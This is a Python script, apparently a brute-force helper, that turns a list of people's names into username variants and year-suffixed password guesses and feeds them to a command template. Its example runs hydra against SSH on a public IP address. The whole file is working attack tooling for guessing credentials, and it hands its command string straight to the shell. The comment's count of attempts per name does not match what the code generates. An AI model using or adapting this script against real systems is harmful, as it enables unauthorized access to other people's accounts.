import sys, os

##################
# example:
#   py x.py names.txt "hyhra -L __user__ -P __passwd__ 8.8.8.8 ssh -V -f"
#
# name : peter parker
#  peterparker
#  p.parker
#  p_parker
#  peter.p
#  peter_p
#  peter.parker
#  peter_parker
#
# password: 
#  add suffix 1960-2021
#
# Every name will generate 440 * 7 crack trys.
###################

users = []
passwds = []

input_names = sys.argv[1]
cmd = sys.argv[2]

with open(input_names) as f_h:
    for one_name in f_h:
        one_n = one_name.strip().lower()
        if one_n == "":   # empty line
            continue

        name_for_file = one_n.replace(" ", "_")
        users_file = name_for_file + "_users.txt"
        passwds_file = name_for_file + "_pass.txt"
        users.clear()
        passwds.clear()

        t_l = one_n.split()
        if len(t_l) == 1:   # single word
            users.append(one_n)
        else:
            # two words or more
            users.append(t_l[0] + t_l[1])
            users.append(t_l[0] + "." + t_l[1])
            users.append(t_l[0] + "_" + t_l[1])
            users.append(t_l[0][0] + "." + t_l[1])
            users.append(t_l[0][0] + "_" + t_l[1])
            users.append(t_l[0] + "." + t_l[1][0])
            users.append(t_l[0] + "_" + t_l[1][0])

        for user in users:
            for i in range(1960, 2022):
                passwds.append(user + str(i))

        users_txt = '\n'.join(users)
        with open(users_file, 'w') as f_h:
            f_h.write(users_txt)

        with open(passwds_file, 'w') as f_h:
            f_h.write(users_txt + '\n')
            passwd_txt = '\n'.join(passwds)
            f_h.write(passwd_txt)

        cmd_t = cmd
        cmd_t = cmd_t.replace("__user__", users_file).replace("__passwd__", passwds_file)
        print("CMD:  " + cmd_t)
        ret = os.popen(cmd_t).read()
        print(ret)
        #os.system("rm -f " + users_file + " " + passwds_file)
